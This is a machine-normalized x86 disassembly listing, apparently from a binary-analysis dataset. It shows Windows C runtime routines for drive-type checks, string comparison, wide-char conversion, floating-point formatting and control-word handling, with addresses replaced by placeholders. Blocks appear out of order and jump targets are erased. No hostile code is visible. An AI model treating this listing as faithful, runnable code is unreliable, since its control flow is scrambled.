sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_454ad8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
add al 0x40
mov [ ebp + 0x8 ] al
lea eax [ ebp + 0x8 ]
push eax
mov [ ebp + 0x9 ] 0x3a
mov [ ebp + 0xa ] 0x5c
mov [ ebp + 0xb ] 0x0
call [ GetDriveTypeA@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
cmp eax 0x1
jne r-xdata
sub_454b11
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_455edd
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_455f1f
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_454c19
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_445f7b
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_44120e
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_4560c5
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_44120e
pop ecx
mov [ ebp - 0x4 ] esi
sub_454cb0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_4428ae
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_4428ae
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_456310
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_454da2
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_443bb7
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_440669
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_440669
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_443bb7
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_4556c6
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_455754
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_4557f4
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_4556c6
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_455754
push eax
mov [ ebp - 0xc ] eax
call sub_4528c2
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
